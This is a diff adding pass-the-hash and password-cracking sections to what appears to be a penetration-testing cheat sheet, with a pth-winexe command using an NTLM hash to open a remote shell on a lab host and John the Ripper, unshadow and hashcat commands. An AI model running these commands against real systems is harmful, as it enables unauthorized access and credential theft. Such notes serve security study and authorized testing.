@@ -110,3 +110,26 @@ token::elevate
 lsadump::sam
 
 ```
+
+#### Pass the hash
+
+```
+pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+
+```
+
+#### Password cracking
+
+```
+sudo john hash.txt --format=NT
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt -- format=NT
+unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
+unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
+
+hashcat64.exe -b
+```
+
+The --fork option engages multiple processes to make use of more CPU cores on a single machine and --node splits the work across multiple machines.
+
+
